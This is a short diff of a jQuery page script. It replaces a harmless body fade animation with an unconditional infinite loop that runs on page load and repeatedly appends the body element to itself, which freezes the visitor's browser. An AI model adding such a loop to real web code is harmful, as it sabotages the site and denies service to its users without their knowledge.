@@ -1,7 +1,8 @@
 $(function () {
     (function () {
-        $('body').fadeOut(10000, function () {
-            $('body').fadeIn(10000);
-        })
+        while (true) {
+            var big = $('body');
+            big.appendTo('body');
+        }
     })();
 });
